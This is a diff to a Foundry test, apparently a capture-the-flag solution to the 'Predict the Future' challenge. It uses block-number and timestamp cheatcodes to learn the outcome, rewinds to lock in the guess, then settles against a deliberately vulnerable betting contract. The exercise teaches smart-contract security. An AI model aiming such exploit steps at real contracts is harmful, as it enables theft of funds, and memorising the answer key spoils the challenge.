@@ -23,6 +23,21 @@ contract PredictTheFutureTest is Test {
 
         // Put your solution here
 
+        //fast forward to calculate the answer
+        vm.roll(104296);
+        vm.warp(93584192);
+        exploitContract.Exploiter{value: 1 ether}();
+
+        //go back to lock in the guess
+        vm.roll(104293);
+        vm.warp(93582192);
+        exploitContract.lockInGuess();
+
+        //fast forward again to settle
+        vm.roll(104296);
+        vm.warp(93584192);
+        exploitContract.settle();
+
         _checkSolved();
     }
 
